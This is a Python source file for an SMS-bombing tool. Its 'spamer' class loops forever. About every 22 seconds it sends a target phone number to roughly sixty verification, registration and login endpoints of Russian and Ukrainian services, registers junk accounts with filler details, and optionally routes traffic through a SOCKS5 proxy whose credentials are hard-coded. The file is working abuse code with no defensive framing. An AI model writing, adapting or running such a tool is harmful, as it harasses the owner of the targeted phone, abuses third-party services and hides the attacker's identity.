import requests
import time


class spamer:
    def __init__(self, number: str, enable_proxy: bool):
        if enable_proxy:
            self.proxy = dict(http='socks5://proxy:PassWord1023@p.sb30.ru:443',
                              https='socks5://proxy:PassWord1023@p.sb30.ru:443')
        else:
            self.proxy = None
        self.number = number
        self.countErrors = 0

    def start(self):
        while True:
            try:
                requests.get('https://api.wowworks.ru/v2/site/send-code', json={"phone": self.number, "type": 2},
                             proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={"phone": self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1

            try:
                requests.post('https://www.yaposhka.kh.ua/customer/account/createpost/',
                              data={"success_url": "", "error_url": "", "is_subscribed": "0",
                                    "firstname": 'dfgdfgdfgdfg',
                                    "lastname": 'sdfgdfgdfgdfgfdg', "email": 'dfgdfgdfgdfggdfgdf@gmail.com',
                                    "password": 'sdfsdfsdfsdfsdfsdfsdf',
                                    "password_confirmation": 'sdfsdfsdfsdfsdfsdfsdf',
                                    "telephone": self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1

            try:
                requests.post('https://api.iconjob.co/api/auth/verification_code', json={"phone": self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1

            try:
                requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={"msisdn": self.number},
                              headers={"App-ID": "cabinet"}, proxies=self.proxy)
            except:
                self.countErrors += 1

            try:
                requests.post('https://ng-api.webbankir.com/user/v2/create',
                              json={"lastName": 'sdfsdfsdf', "firstName": 'sdfggdfg', "middleName": 'sdfsdf',
                                    "mobilePhone": self.number,
                                    "email": 'dfgdfgdfgdfggdfgdf@gmail.com', "smsCode": ""}, proxies=self.proxy)
            except:
                self.countErrors += 1

            try:
                requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1

            try:
                requests.post('https://www.uklon.com.ua/api/v1/account/code/send',
                              headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://passport.twitch.tv/register?trusted_request=true",
                              json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                    "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                    "password": 'dfgdfgdffgd', "phone_number": self.number,
                                    "username": 'sdfsdfsfsfsdfsdf'}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" + self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                              data={"phone_number": self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://msk.tele2.ru/api/validation/number/" + self.number, json={"sender": "Tele2"},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.get("https://www.sportmaster.ua/",
                             params={"module": "users", "action": "SendSMSReg", "phone": self.number},
                             proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
                             params={"oper": 9, "callmode": 1, "phone": "+" + self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://shopandshow.ru/sms/password-request/",
                              data={"phone": "+" + self.number, "resend": 0}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",
                              json={"userPhone": "+" + self.number},
                              headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/", json={"phone": self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode", headers={"token": "."},
                              data={"phone": self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://plink.tech/resend_activation_token/?via=call", json={"phone": self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": self.number},
                             proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
                              json={"phone": self.number, "otpId": 0}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.get("https://secure.online.ua/ajax/checkself.number/", params={"regself.number": self.number},
                             proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://www.ollis.ru/gql", json={
                    "query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }' % self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                              data={"st.r.phone": "+" + self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login",
                                                         "sessid": "bf70db951f54b837748f69b75a61deb4",
                                                         "method": "sendCode", "phone": self.number,
                                                         "registration": "N"}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://account.my.games/signup_send_sms/", data={"phone": self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post(
                    "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
                    params={"pageName": "registerPrivateUserPhoneVerificatio"},
                    data={"phone": self.number, "recaptcha": "off", "g-recaptcha-response": ""}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://auth.multiplex.ua/login", json={"login": self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://www.moyo.ua/identity/registration",
                              data={"firstname": 'name', "phone": self.number, "email": 'dsfssdfsdfsdfsd@gmail.com'},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://www.monobank.com.ua/api/mobapplink/send", data={"phone": "+" + self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://mobileplanet.ua/register",
                              data={"klient_name": 'name', "klientself.number": "+" + self.number,
                                    "klient_email": 'emasdfssssssdfgsgil@gmail.com'}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",
                              data={"user_info[fullname]": 'nsdfsdfame', "user_info[phone]": self.number,
                                    "user_info[email]": 'sdfsdfsdfsdfsffsf@gmail.com',
                                    "user_info[password]": 'dfgdfgdfg',
                                    "user_info[conf_password]": 'dfgdfgdfg', }, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://cloud.mail.ru/api/v2/notify/applink",
                              json={"phone": "+" + self.number, "api": 2, "email": "sdfsdfsdfsdfsffsf@gmail.com",
                                    "x-email": "sdfsdfsdfsdfsffsf@gmail.com", },
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
                              json={"phone": "+" + self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms", headers={"Agent": "website"},
                              json={"Phone": self.number, "Type": 1}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
                              json={"phone": "+" + self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                              data={"password": 'dfgdfgdfg', "application": "lkp", "login": "+" + self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                              data={"mode": "request", "phone": "+" + self.number, "phone_permission": "unknown",
                                    "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown",
                                    "devicemodel": "unknown", }, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://icq.com/smscode/login/ru", data={"msisdn": self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://helsi.me/api/healthy/accounts/login",
                              json={"phone": self.number, "platform": "PISWeb"}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://guru.taxi/api/v1/driver/session/verify",
                              json={"phone": {"code": 1, "number": self.number}}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://fix-price.ru/ajax/registerself.number_code.php",
                              data={"register_call": "Y", "action": "getCode", "phone": "+" + self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.get("https://findclone.ru/register", params={"phone": "+" + self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://www.finam.ru/api/smslocker/sendcode", data={"phone": "+" + self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://api.easypay.ua/api/auth/register",
                              json={"phone": self.number, "password": 'dfgdfgdfgdfgdfgdfgdf'}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://app.cloudloyalty.ru/demo/send-code",
                              json={"country": 2, "phone": self.number, "roistatVisit": "47637",
                                    "experiments": {"new_header_title": "1"}, }, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://city24.ua/personalaccount/account/registration",
                              data={"PhoneNumber": self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://www.citilink.ru/registration/confirm/phone/+" + self.number + "/")
            except:
                self.countErrors += 1
            try:
                requests.post("https://api.carsmile.com/",
                              json={"operationName": "enterPhone", "variables": {"phone": self.number},
                                    "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n", },
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://app.benzuber.ru/login", data={"phone": "+" + self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://alfalife.cc/auth.php", data={"phone": self.number}, proxies=self.proxy)
            except:
                self.countErrors += 1
            try:
                requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": self.number},
                              proxies=self.proxy)
            except:
                self.countErrors += 1
            print('Errors for sms: ' + str(self.countErrors))
            self.countErrors = 0
            time.sleep(22)
